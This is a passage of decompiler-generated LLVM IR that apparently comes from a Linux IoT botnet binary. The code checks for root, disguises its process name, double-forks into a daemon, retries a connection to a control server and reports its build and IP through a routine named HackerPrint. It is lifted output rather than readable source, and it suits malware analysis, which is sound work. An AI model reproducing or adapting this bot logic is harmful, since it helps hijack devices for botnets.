  %v5_8050a7c = call i32 @strstr(i32 %v2_8050ac3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805c8f0.897, i32 0, i32 0))
  %v1_8050a84 = icmp eq i32 %v5_8050a7c, 0
  br i1 %v1_8050a84, label %dec_label_pc_8050aa7, label %dec_label_pc_8050a96.preheader

dec_label_pc_8050a96.preheader:                   ; preds = %dec_label_pc_8050a6d
  %v2_8050a9942 = load i8, i8* %stack_var_-4156, align 1
  %v10_8050a9b47 = icmp eq i8 %v2_8050a9942, 9
  %v1_8050a9d48 = icmp eq i1 %v10_8050a9b47, false
  br i1 %v1_8050a9d48, label %dec_label_pc_8050a93, label %dec_label_pc_8050a9f

dec_label_pc_8050a93:                             ; preds = %dec_label_pc_8050a96.preheader, %dec_label_pc_8050a93
  %v4_8050a9649 = phi i32 [ %v5_8050a93, %dec_label_pc_8050a93 ], [ %v2_8050ac3, %dec_label_pc_8050a96.preheader ]
  %v5_8050a93 = add i32 %v4_8050a9649, 1
  %v22_8050a93 = inttoptr i32 %v5_8050a93 to i8*
  %v2_8050a99 = load i8, i8* %v22_8050a93, align 1
  %v10_8050a9b = icmp eq i8 %v2_8050a99, 9
  %v1_8050a9d = icmp eq i1 %v10_8050a9b, false
  br i1 %v1_8050a9d, label %dec_label_pc_8050a93, label %dec_label_pc_8050a9f

dec_label_pc_8050a9f:                             ; preds = %dec_label_pc_8050a93, %dec_label_pc_8050a96.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_8050a96.preheader ], [ %v22_8050a93, %dec_label_pc_8050a93 ]
  store i8 0, i8* %storemerge5.lcssa, align 1
  br label %dec_label_pc_8050ae1

dec_label_pc_8050aa7:                             ; preds = %dec_label_pc_8050a6d
  %v6_8050abb = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_8050ad5 = call i32 @fdgets(i32 %v2_8050ac3, i32 4096, i32 %v5_8050a60)
  %v1_8050add = icmp eq i32 %v5_8050ad5, 0
  %v1_8050adf = icmp eq i1 %v1_8050add, false
  br i1 %v1_8050adf, label %dec_label_pc_8050a6d, label %dec_label_pc_8050ae1

dec_label_pc_8050ae1:                             ; preds = %dec_label_pc_8050a4e, %dec_label_pc_8050aa7, %dec_label_pc_8050a9f
  %v2_8050ae7 = call i32 @__libc_close(i32 %v5_8050a60)
  %v3_8050aef = load i8, i8* %stack_var_-4156, align 1
  %v4_8050af5 = icmp eq i8 %v3_8050aef, 0
  br i1 %v4_8050af5, label %dec_label_pc_8050b58, label %dec_label_pc_8050af9

dec_label_pc_8050af9:                             ; preds = %dec_label_pc_8050ae1
  %v2_8050b03 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_8050b03, i32* @eax, align 4
  %tmp39 = bitcast i32* %stack_var_-4188 to i8*
  %v5_8050b0a = call i32 @strcpy(i8* %tmp39, i32 %v2_8050ac3)
  %v5_8050b24 = call i32 @ioctl(i32 %v5_8050985, i32 35111, i32 %v2_8050b03)
  %v2_8050b3e = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_8050b35

dec_label_pc_8050b35:                             ; preds = %dec_label_pc_8050af9, %dec_label_pc_8050b35
  %storemerge40 = phi i32 [ 0, %dec_label_pc_8050af9 ], [ %v4_8050b4f, %dec_label_pc_8050b35 ]
  %v2_8050b44 = add i32 %storemerge40, %v2_8050b3e
  %v1_8050b47 = inttoptr i32 %v2_8050b44 to i8*
  %v2_8050b47 = load i8, i8* %v1_8050b47, align 1
  %v3_8050b49 = add i32 %storemerge40, ptrtoint (i8** @global_var_805f8d0.898 to i32)
  %v4_8050b49 = inttoptr i32 %v3_8050b49 to i8*
  store i8 %v2_8050b47, i8* %v4_8050b49, align 1
  %v4_8050b4f = add nuw nsw i32 %storemerge40, 1
  %exitcond = icmp eq i32 %v4_8050b4f, 6
  br i1 %exitcond, label %dec_label_pc_8050b58.loopexit, label %dec_label_pc_8050b35

dec_label_pc_8050b58.loopexit:                    ; preds = %dec_label_pc_8050b35
  br label %dec_label_pc_8050b58

dec_label_pc_8050b58:                             ; preds = %dec_label_pc_8050b58.loopexit, %dec_label_pc_8050ae1
  %v2_8050b5e = call i32 @__libc_close(i32 %v5_8050985)
  %v3_8050b74.pre = load i32, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_8050b74

dec_label_pc_8050b68:                             ; preds = %dec_label_pc_8050a19, %dec_label_pc_80509a5, %entry
  store i32 0, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_8050b74

dec_label_pc_8050b74:                             ; preds = %dec_label_pc_8050b58, %dec_label_pc_8050b68
  %v3_8050b74 = phi i32 [ %v3_8050b74.pre, %dec_label_pc_8050b58 ], [ 0, %dec_label_pc_8050b68 ]
  ret i32 %v3_8050b74

; uselistorder directives
  uselistorder i32 %v5_8050a93, { 1, 0 }
  uselistorder i32 %v2_8050ac3, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v5_8050a60, { 2, 1, 0 }
  uselistorder i32 %v5_8050985, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-4204, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @htons, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 15, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050b74, { 1, 0 }
  uselistorder label %dec_label_pc_8050b35, { 1, 0 }
  uselistorder label %dec_label_pc_8050ae1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050a93, { 1, 0 }
  uselistorder label %dec_label_pc_8050a6d, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v3_8050b8c = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_805c8fb.899 to i32), i32 0)
  %v10_8050b94 = icmp eq i32 %v3_8050b8c, -1
  %v4_8050ba9 = select i1 %v10_8050b94, i32 ptrtoint ([7 x i8]* @global_var_805c912.901 to i32), i32 ptrtoint ([7 x i8]* @global_var_805c90b.900 to i32)
  ret i32 %v4_8050ba9
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %tmp118 = call i32 @__decompiler_undefined_function_0()
  %tmp119 = call i32 @__decompiler_undefined_function_0()
  %tmp127 = call i8* @__decompiler_undefined_function_2()
  %tmp136 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-5376 = alloca i32, align 4
  %stack_var_-5360 = alloca i8*, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8050bae = ptrtoint i32* %stack_var_4 to i32
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805c8fb.899, i32 0, i32 0), i8** %stack_var_-5360, align 4
  %v4_8050bdb = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_805c8fb.899 to i32), i32 0)
  store i32 %v4_8050bdb, i32* %eax.global-to-local, align 4
  %v10_8050be3 = icmp eq i32 %v4_8050bdb, -1
  %v0_8050bf8 = call i32 @geteuid()
  store i32 %v0_8050bf8, i32* %eax.global-to-local, align 4
  %v1_8050bfd = icmp eq i32 %v0_8050bf8, 0
  %v1_8050bff = icmp eq i1 %v1_8050bfd, false
  %tmp266 = select i1 %v10_8050be3, i32 ptrtoint ([19 x i8]* @global_var_805c91f.904 to i32), i32 ptrtoint ([5 x i8]* @global_var_805c91a.903 to i32)
  br i1 %v1_8050bff, label %dec_label_pc_8050c0b, label %dec_label_pc_8050c01

dec_label_pc_8050c01:                             ; preds = %entry
  store i32 0, i32* @global_var_805f58c.905, align 4
  br label %dec_label_pc_8050c0b

dec_label_pc_8050c0b:                             ; preds = %entry, %dec_label_pc_8050c01
  %v0_8050c0b = call i32 @getBuild()
  store i32 %v0_8050c0b, i32* %eax.global-to-local, align 4
  %v0_8050c1614 = load i32, i32* bitcast (i8** @global_var_8065b48.232 to i32*), align 4
  %tmp170 = bitcast i8** %stack_var_-5360 to i32*
  store i32 %v0_8050c1614, i32* %tmp170, align 4
  %v2_8050c1c = call i32 @__GI_inet_ntoa(i32 %v0_8050c1614)
  store i32 %v2_8050c1c, i32* %eax.global-to-local, align 4
  store i32 %v2_8050c1c, i32* @ebx, align 4
  %v0_8050c26 = call i32 @getBuild()
  store i32 %v0_8050c26, i32* %eax.global-to-local, align 4
  %v0_8050c2e = load i32, i32* @ebx, align 4
  %v5_8050c2e = inttoptr i32 %v0_8050c2e to i8*
  %v5_8050c2f = inttoptr i32 %v0_8050c26 to i8*
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805c932.906, i32 0, i32 0), i8** %stack_var_-5360, align 4
  %v9_8050c35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805c932.906, i32 0, i32 0), i8* %v5_8050c2f, i8* %v5_8050c2e)
  store i32 %v9_8050c35, i32* %eax.global-to-local, align 4
  store i32 %v2_8050bae, i32* %edx.global-to-local, align 4
  %v1_8050c43 = add i32 %v2_8050bae, 4
  %v2_8050c43 = inttoptr i32 %v1_8050c43 to i32*
  %v3_8050c43 = load i32, i32* %v2_8050c43, align 4
  store i32 %v3_8050c43, i32* %eax.global-to-local, align 4
  %v1_8050c46 = inttoptr i32 %v3_8050c43 to i32*
  %v2_8050c46 = load i32, i32* %v1_8050c46, align 4
  %v1_8050c53 = and i32 %v2_8050c46, -256
  store i32 %v1_8050c53, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8050c56 = inttoptr i32 %v2_8050c46 to i8*
  %v3_8050c5c = call i32 @_strlen(i8* %v4_8050c56)
  %v4_8050c5c = mul i32 %v3_8050c5c, -1
  %v1_8050c60 = sub i32 1, %v4_8050c5c
  store i32 %v1_8050c60, i32* %eax.global-to-local, align 4
  %v1_8050c62 = sub i32 0, %v4_8050c5c
  store i32 %v1_8050c62, i32* %edx.global-to-local, align 4
  %v3_8050c6b = load i32, i32* %v2_8050c43, align 4
  store i32 %v3_8050c6b, i32* %eax.global-to-local, align 4
  %v1_8050c6e = inttoptr i32 %v3_8050c6b to i32*
  %v2_8050c6e = load i32, i32* %v1_8050c6e, align 4
  store i32 %v2_8050c6e, i32* %eax.global-to-local, align 4
  %v5_8050c79 = inttoptr i32 %v2_8050c6e to i8*
  store i8* %v5_8050c79, i8** %stack_var_-5360, align 4
  %v7_8050c7a = call i32 @strncpy(i8* %v5_8050c79, i32 ptrtoint (i8** @global_var_805c919.902 to i32), i32 %v1_8050c62)
  store i32 %v7_8050c7a, i32* %eax.global-to-local, align 4
  store i32 %v2_8050bae, i32* @edi, align 4
  %v3_8050c88 = load i32, i32* %v2_8050c43, align 4
  store i32 %v3_8050c88, i32* %eax.global-to-local, align 4
  %v1_8050c8b = inttoptr i32 %v3_8050c88 to i32*
  %v2_8050c8b = load i32, i32* %v1_8050c8b, align 4
  store i32 %v2_8050c8b, i32* %eax.global-to-local, align 4
  %v5_8050c93 = inttoptr i32 %v2_8050c8b to i8*
  store i8* %v5_8050c93, i8** %stack_var_-5360, align 4
  %v4_8050c94 = call i32 @sprintf(i32 %v2_8050c8b, i32 %tmp266)
  store i32 %tmp266, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-5360, align 4
  store i32 15, i32* %stack_var_-5376, align 4
  %v7_8050cab = call i32 @prctl(i32 15, i32 %tmp266, i32 0, i32 0, i32 0)
  store i32 %v7_8050cab, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-5360, align 4
  %v3_8050cb8 = call i32 @__GI_time(i32* null)
  store i32 %v3_8050cb8, i32* %eax.global-to-local, align 4
  store i32 %v3_8050cb8, i32* @ebx, align 4
  %v0_8050cc2 = call i32 @__libc_getpid()
  %v1_8050cc7 = load i32, i32* @ebx, align 4
  %v2_8050cc7 = xor i32 %v1_8050cc7, %v0_8050cc2
  store i32 %v2_8050cc7, i32* @eax, align 4
  %v5_8050ccc = inttoptr i32 %v2_8050cc7 to i8*
  store i8* %v5_8050ccc, i8** %stack_var_-5360, align 4
  %v2_8050ccd = call i32 @srand(i32 %v2_8050cc7)
  store i32 %v2_8050ccd, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-5360, align 4
  %v3_8050cda = call i32 @__GI_time(i32* null)
  store i32 %v3_8050cda, i32* %eax.global-to-local, align 4
  store i32 %v3_8050cda, i32* @ebx, align 4
  %v0_8050ce4 = call i32 @__libc_getpid()
  %v1_8050ce9 = load i32, i32* @ebx, align 4
  %v2_8050ce9 = xor i32 %v1_8050ce9, %v0_8050ce4
  store i32 %v2_8050ce9, i32* %eax.global-to-local, align 4
  %v1_8050cec = call i32 @init_rand(i32 %v2_8050ce9)
  store i32 %v1_8050cec, i32* %eax.global-to-local, align 4
  %v0_8050cf4 = call i32 @getOurIP()
  store i32 %v0_8050cf4, i32* %eax.global-to-local, align 4
  %v1_8050cf9 = call i32 @__libc_fork(i32 %v2_8050ce9)
  store i32 %v1_8050cf9, i32* %eax.global-to-local, align 4
  %v4_8050d01 = icmp eq i32 %v1_8050cf9, 0
  br i1 %v4_8050d01, label %dec_label_pc_8050d2b, label %dec_label_pc_8050d25.thread

dec_label_pc_8050d25.thread:                      ; preds = %dec_label_pc_8050c0b
  %v2_8050d0c = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_8050d0c, i32* %eax.global-to-local, align 4
  %v8_8050d10 = inttoptr i32 %v1_8050cf9 to i8*
  store i8* %v8_8050d10, i8** %stack_var_-5360, align 4
  %v6_8050d13 = call i32 @__libc_waitpid(i32 %v1_8050cf9, i32 %v2_8050d0c, i32 0)
  store i32 %v6_8050d13, i32* @eax, align 4
  store i8* null, i8** %stack_var_-5360, align 4
  %v2_8050d20 = call i32 @__GI_exit(i32 0)
  store i32 %v2_8050d20, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d43

dec_label_pc_8050d2b:                             ; preds = %dec_label_pc_8050c0b
  %v0_8050d2b = load i8*, i8** %stack_var_-5360, align 4
  %v1_8050d2b = ptrtoint i8* %v0_8050d2b to i32
  %v2_8050d2b = call i32 @__libc_fork(i32 %v1_8050d2b)
  store i32 %v2_8050d2b, i32* @eax, align 4
  %v4_8050d33 = icmp eq i32 %v2_8050d2b, 0
  br i1 %v4_8050d33, label %dec_label_pc_8050d43, label %dec_label_pc_8050d39

dec_label_pc_8050d39:                             ; preds = %dec_label_pc_8050d2b
  store i32 0, i32* %stack_var_-5376, align 4
  %v1_8050d3e = call i32 @__GI_exit(i32 0)
  store i32 %v1_8050d3e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d43

dec_label_pc_8050d43:                             ; preds = %dec_label_pc_8050d25.thread, %dec_label_pc_8050d2b, %dec_label_pc_8050d39
  %v0_8050d43 = call i32 @__GI_setsid()
  store i32 %v0_8050d43, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805c93f.907 to i32), i32* %stack_var_-5376, align 4
  %v1_8050d50 = call i32 @chdir(i32 ptrtoint (i32* @global_var_805c93f.907 to i32))
  store i32 %v1_8050d50, i32* %eax.global-to-local, align 4
  store i32 13, i32* %stack_var_-5376, align 4
  %v3_8050d5f = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v3_8050d5f, i32* %eax.global-to-local, align 4
  %v2_8051399 = ptrtoint i32* %stack_var_-5252 to i32
  %tmp172 = bitcast i32* %stack_var_-5252 to i8*
  %tmp173 = bitcast i8** %stack_var_-36 to i32*
  %v2_8051356 = ptrtoint i8** %stack_var_-132 to i32
  %v2_80511c0 = ptrtoint i32* %stack_var_-1156 to i32
  %v5_805106f = and i32 %v2_8051399, -256
  %v1_805107c = or i32 %v2_8051399, 1
  %storemerge18194 = inttoptr i32 %v1_805107c to i8*
  br label %dec_label_pc_8050d69.outer

dec_label_pc_8050d69.outer:                       ; preds = %dec_label_pc_8051399, %dec_label_pc_8050d43
  %stack_var_-28.0.ph = phi i32 [ %tmp, %dec_label_pc_8050d43 ], [ %stack_var_-28.1.ph, %dec_label_pc_8051399 ]
  %stack_var_-40.0.ph = phi i32 [ %tmp118, %dec_label_pc_8050d43 ], [ %stack_var_-40.3.ph30, %dec_label_pc_8051399 ]
  %stack_var_-32.0.ph = phi i32 [ %tmp119, %dec_label_pc_8050d43 ], [ %stack_var_-32.2.ph31, %dec_label_pc_8051399 ]
  %stack_var_-64.0.ph = phi i8* [ %tmp127, %dec_label_pc_8050d43 ], [ %stack_var_-64.2.ph35, %dec_label_pc_8051399 ]
  %stack_var_-60.0.ph = phi i32 [ %tmp136, %dec_label_pc_8050d43 ], [ %stack_var_-60.3, %dec_label_pc_8051399 ]
  %v0_8050d6956 = call i32 @initConnection()
  store i32 %v0_8050d6956, i32* %eax.global-to-local, align 4
  %v1_8050d6e57 = icmp eq i32 %v0_8050d6956, 0
  br i1 %v1_8050d6e57, label %dec_label_pc_8050d81, label %dec_label_pc_8050d72

dec_label_pc_8050d72:                             ; preds = %dec_label_pc_8050d69.outer, %dec_label_pc_8050d72
  %v0_8050d72 = load i32, i32* @esp, align 4
  %v1_8050d75 = add i32 %v0_8050d72, -16
  %v2_8050d75 = inttoptr i32 %v1_8050d75 to i32*
  store i32 5, i32* %v2_8050d75, align 4
  %v0_8050d77 = load i32, i32* %stack_var_-5376, align 4
  %v1_8050d77 = call i32 @sleep(i32 %v0_8050d77)
  store i32 %v1_8050d77, i32* %eax.global-to-local, align 4
  %v0_8050d69 = call i32 @initConnection()
  store i32 %v0_8050d69, i32* %eax.global-to-local, align 4
  %v1_8050d6e = icmp eq i32 %v0_8050d69, 0
  br i1 %v1_8050d6e, label %dec_label_pc_8050d81, label %dec_label_pc_8050d72

dec_label_pc_8050d81:                             ; preds = %dec_label_pc_8050d72, %dec_label_pc_8050d69.outer
  %v0_8050d81 = call i32 @getBuild()
  store i32 %v0_8050d81, i32* %eax.global-to-local, align 4
  store i32 %v0_8050d81, i32* @ebx, align 4
  %v0_8050d88 = load i32, i32* @esp, align 4
  %v0_8050d8b = load i8*, i8** @global_var_8065b48.232, align 4
  %v1_8050d8b = ptrtoint i8* %v0_8050d8b to i32
  %v3_8050d8b = add i32 %v0_8050d88, -16
  %v4_8050d8b = inttoptr i32 %v3_8050d8b to i32*
  store i32 %v1_8050d8b, i32* %v4_8050d8b, align 4
  %v0_8050d91 = load i32, i32* %stack_var_-5376, align 4
  %v1_8050d91 = call i32 @__GI_inet_ntoa(i32 %v0_8050d91)
  store i32 %v1_8050d91, i32* %eax.global-to-local, align 4
  %v0_8050d96 = load i32, i32* @esp, align 4
  %v0_8050d99 = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_8050d99, i32* %edx.global-to-local, align 4
  %v2_8050da2 = inttoptr i32 %v0_8050d96 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_805c941.908 to i32), i32* %v2_8050da2, align 4
  %v0_8050da7 = load i32, i32* @ebx, align 4
  %v2_8050da7 = add i32 %v0_8050d96, -4
  %v3_8050da7 = inttoptr i32 %v2_8050da7 to i32*
  store i32 %v0_8050da7, i32* %v3_8050da7, align 4
  %v2_8050da8 = add i32 %v0_8050d96, -8
  %v3_8050da8 = inttoptr i32 %v2_8050da8 to i32*
  store i32 %v1_8050d91, i32* %v3_8050da8, align 4
  %v1_8050da9 = add i32 %v0_8050d96, -12
  %v2_8050da9 = inttoptr i32 %v1_8050da9 to i32*
  store i32 ptrtoint (i32* @global_var_805c94c.909 to i32), i32* %v2_8050da9, align 4
  %v0_8050dae = load i32, i32* %edx.global-to-local, align 4
  %v2_8050dae = add i32 %v0_8050d96, -16
  %v3_8050dae = inttoptr i32 %v2_8050dae to i32*
  store i32 %v0_8050dae, i32* %v3_8050dae, align 4
  %v0_8050daf = load i32, i32* %stack_var_-5376, align 4
  %v3_8050daf = call i32 @HackerPrint(i32 %v0_8050daf, i32 1)
  store i32 %v3_8050daf, i32* %eax.global-to-local, align 4
  %v0_8050db4 = load i32, i32* @esp, align 4
  %v1_8050db4 = add i32 %v0_8050db4, 32
  br label %dec_label_pc_8051399.outer

dec_label_pc_8050dd6:                             ; preds = %dec_label_pc_8050fc9, %dec_label_pc_8050f7e
  %v2_8050dd9 = mul i32 %storemerge19, 4
  store i32 %v2_8050dd9, i32* %edx.global-to-local, align 4
  %v0_8050dde = load i32, i32* @global_var_8065b54.25, align 4
  %v2_8050de3 = add i32 %v0_8050dde, %v2_8050dd9
  store i32 %v2_8050de3, i32* %eax.global-to-local, align 4
  %v1_8050de6 = inttoptr i32 %v2_8050de3 to i32*
  %v2_8050de6 = load i32, i32* %v1_8050de6, align 4
  store i32 %v2_8050de6, i32* %eax.global-to-local, align 4
  %v1_8050deb = add i32 %v0_8050de8.in, 8
  %v2_8050deb = inttoptr i32 %v1_8050deb to i32*
  store i32 1, i32* %v2_8050deb, align 4
  %v1_8050ded = add i32 %v0_8050de8.in, 4
  %v2_8050ded = inttoptr i32 %v1_8050ded to i32*
  store i32 0, i32* %v2_8050ded, align 4
  %v0_8050def = load i32, i32* %eax.global-to-local, align 4
  %v3_8050def = inttoptr i32 %v0_8050de8.in to i32*
  store i32 %v0_8050def, i32* %v3_8050def, align 4
  %v4_8050df0 = call i32 @__libc_waitpid(i32 %storemerge19, i32 %v2_8050df0, i32 %stack_var_-60.2)
  store i32 %v4_8050df0, i32* %eax.global-to-local, align 4
  %v0_8050df5 = load i32, i32* @esp, align 4
  %tmp174 = icmp slt i32 %v4_8050df0, 1
  %.pre = add i32 %storemerge19, 1
  br i1 %tmp174, label %dec_label_pc_8050f7b, label %dec_label_pc_8050e00

dec_label_pc_8050e00:                             ; preds = %dec_label_pc_8050dd6
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e33

dec_label_pc_8050e09:                             ; preds = %dec_label_pc_8050e33, %dec_label_pc_8050e6d
  %v2_8050e0c = mul i32 %storemerge21, 4
  %v0_8050e11 = load i32, i32* @global_var_8065b54.25, align 4
  %v2_8050e16 = add i32 %v0_8050e11, %v2_8050e0c
  %v1_8050e19 = add i32 %v2_8050e16, -4
  store i32 %v2_8050e0c, i32* %edx.global-to-local, align 4
  store i32 %v2_8050e16, i32* %eax.global-to-local, align 4
  %v1_8050e2c = inttoptr i32 %v2_8050e16 to i32*
  %v2_8050e2c = load i32, i32* %v1_8050e2c, align 4
  store i32 %v2_8050e2c, i32* %eax.global-to-local, align 4
  %v2_8050e2e = inttoptr i32 %v1_8050e19 to i32*
  store i32 %v2_8050e2c, i32* %v2_8050e2e, align 4
  %v4_8050e30 = add i32 %storemerge21, 1
  br label %dec_label_pc_8050e33

dec_label_pc_8050e33:                             ; preds = %dec_label_pc_8050e00, %dec_label_pc_8050e09
  %storemerge21 = phi i32 [ %v4_8050e30, %dec_label_pc_8050e09 ], [ %.pre, %dec_label_pc_8050e00 ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v0_8050e47 = load i32, i32* @global_var_805f8c8.23, align 8
  store i32 %v0_8050e47, i32* %edx.global-to-local, align 4
  %v0_8050e4d = load i32, i32* @global_var_805f8cc.24, align 4
  %v10_8050e65 = icmp eq i32 %v0_8050e4d, 0
  br i1 %v10_8050e65, label %dec_label_pc_8050e6d, label %dec_label_pc_8050e09

dec_label_pc_8050e6d:                             ; preds = %dec_label_pc_8050e33
  store i32 0, i32* @edi, align 4
  store i32 %v0_8050e47, i32* %eax.global-to-local, align 4
  %v10_8050e81 = icmp ult i32 %storemerge21, %v0_8050e47
  br i1 %v10_8050e81, label %dec_label_pc_8050e09, label %dec_label_pc_8050e89

dec_label_pc_8050e89:                             ; preds = %dec_label_pc_8050e6d
  %v2_8050e8c = mul i32 %storemerge21, 4
  %v0_8050e91 = load i32, i32* @global_var_8065b54.25, align 4
  %v2_8050e96 = add i32 %v2_8050e8c, -4
  %v1_8050e99 = add i32 %v2_8050e96, %v0_8050e91
  %v1_8050e9c = inttoptr i32 %v1_8050e99 to i32*
  store i32 0, i32* %v1_8050e9c, align 4
  %v0_8050ea2 = load i32, i32* @global_var_805f8c8.23, align 8
  %v0_8050ea7 = load i32, i32* @global_var_805f8cc.24, align 4
  %v1_8050ead = add i32 %v0_8050ea2, -1
  %v4_8050ead = icmp ne i32 %v0_8050ea2, 0
  %v2_8050eb0 = zext i1 %v4_8050ead to i32
  %v3_8050eb0 = add i32 %v0_8050ea7, -1
  %v4_8050eb0 = add i32 %v3_8050eb0, %v2_8050eb0
  store i32 %v1_8050ead, i32* @global_var_805f8c8.23, align 8
  store i32 %v4_8050eb0, i32* @global_var_805f8cc.24, align 4
  %v3_8050ec9 = mul i32 %v4_8050eb0, 4
  %v4_8050ec9 = udiv i32 %v1_8050ead, 1073741824
  %v5_8050ec9 = or i32 %v3_8050ec9, %v4_8050ec9
  store i32 %v5_8050ec9, i32* %edx.global-to-local, align 4
  %v2_8050ecd = mul i32 %v1_8050ead, 4
  %v1_8050ed0 = add i32 %v2_8050ecd, 4
  store i32 %v1_8050ed0, i32* %eax.global-to-local, align 4
  %v0_8050ed3 = load i32, i32* @esp, align 4
  %v2_8050ed6 = add i32 %v0_8050ed3, -16
  %v3_8050ed6 = inttoptr i32 %v2_8050ed6 to i32*
  store i32 %v1_8050ed0, i32* %v3_8050ed6, align 4
  %v1_8050ed7 = call i32 @malloc(i32 0)
  store i32 %v1_8050ed7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f0d

dec_label_pc_8050eeb:                             ; preds = %dec_label_pc_8050f0d, %dec_label_pc_8050f46
  %v2_8050eee = mul i32 %storemerge20, 4
  %v5_8050ef3 = add i32 %v2_8050eee, %v1_8050ed7
  store i32 %v2_8050eee, i32* %edx.global-to-local, align 4
  %v0_8050efe = load i32, i32* @global_var_8065b54.25, align 4
  %v2_8050f03 = add i32 %v0_8050efe, %v2_8050eee
  store i32 %v2_8050f03, i32* %eax.global-to-local, align 4
  %v1_8050f06 = inttoptr i32 %v2_8050f03 to i32*
  %v2_8050f06 = load i32, i32* %v1_8050f06, align 4
  store i32 %v2_8050f06, i32* %eax.global-to-local, align 4
  %v2_8050f08 = inttoptr i32 %v5_8050ef3 to i32*
  store i32 %v2_8050f06, i32* %v2_8050f08, align 4
  %v4_8050f0a = add i32 %storemerge20, 1
  br label %dec_label_pc_8050f0d

dec_label_pc_8050f0d:                             ; preds = %dec_label_pc_8050e89, %dec_label_pc_8050eeb
  %storemerge20 = phi i32 [ %v4_8050f0a, %dec_label_pc_8050eeb ], [ 0, %dec_label_pc_8050e89 ]
  %v0_8050f21 = load i32, i32* @global_var_805f8c8.23, align 8
  store i32 %v0_8050f21, i32* %eax.global-to-local, align 4
  %v0_8050f26 = load i32, i32* @global_var_805f8cc.24, align 4
  store i32 %v0_8050f26, i32* %edx.global-to-local, align 4
  %v10_8050f3e = icmp eq i32 %v0_8050f26, 0
  br i1 %v10_8050f3e, label %dec_label_pc_8050f46, label %dec_label_pc_8050eeb

dec_label_pc_8050f46:                             ; preds = %dec_label_pc_8050f0d
  store i32 %v0_8050f21, i32* @edi, align 4
  %v10_8050f5a = icmp ult i32 %storemerge20, %v0_8050f21
  br i1 %v10_8050f5a, label %dec_label_pc_8050eeb, label %dec_label_pc_8050f62

dec_label_pc_8050f62:                             ; preds = %dec_label_pc_8050f46
  %v0_8050f62 = load i32, i32* @global_var_8065b54.25, align 4
  store i32 %v0_8050f62, i32* %eax.global-to-local, align 4
  %v0_8050f67 = load i32, i32* @esp, align 4
  %v2_8050f6a = add i32 %v0_8050f67, -16
  %v3_8050f6a = inttoptr i32 %v2_8050f6a to i32*
  store i32 %v0_8050f62, i32* %v3_8050f6a, align 4
  %v1_8050f6b = call i32 @free(i32 0)
  %v0_8050f70 = load i32, i32* @esp, align 4
  store i32 %v1_8050ed7, i32* %eax.global-to-local, align 4
  store i32 %v1_8050ed7, i32* @global_var_8065b54.25, align 4
  br label %dec_label_pc_8050f7b

dec_label_pc_8050f7b:                             ; preds = %dec_label_pc_8050dd6, %dec_label_pc_8050f62
  %v0_8050de8105.in = phi i32 [ %v0_8050f70, %dec_label_pc_8050f62 ], [ %v0_8050df5, %dec_label_pc_8050dd6 ]
  %stack_var_-60.1 = phi i32 [ %v1_8050ed7, %dec_label_pc_8050f62 ], [ %stack_var_-60.2, %dec_label_pc_8050dd6 ]
  br label %dec_label_pc_8050f7e

dec_label_pc_8050f7e:                             ; preds = %dec_label_pc_8051399, %dec_label_pc_8050f7b
  %v0_8050de8.in = phi i32 [ %v0_8050de8105.in, %dec_label_pc_8050f7b ], [ %v0_80513b4, %dec_label_pc_8051399 ]
  %stack_var_-60.2 = phi i32 [ %stack_var_-60.1, %dec_label_pc_8050f7b ], [ %stack_var_-60.3, %dec_label_pc_8051399 ]
  %storemerge19 = phi i32 [ %.pre, %dec_label_pc_8050f7b ], [ 0, %dec_label_pc_8051399 ]
  %v2_8050f89 = ashr i32 %storemerge19, 31
  %v0_8050f92 = load i32, i32* @global_var_805f8c8.23, align 8
  store i32 %v0_8050f92, i32* %eax.global-to-local, align 4
  %v0_8050f97 = load i32, i32* @global_var_805f8cc.24, align 4
  store i32 %v0_8050f97, i32* %edx.global-to-local, align 4
  %v10_8050faf = icmp ult i32 %v2_8050f89, %v0_8050f97
  br i1 %v10_8050faf, label %dec_label_pc_8050dd6, label %dec_label_pc_8050fbb
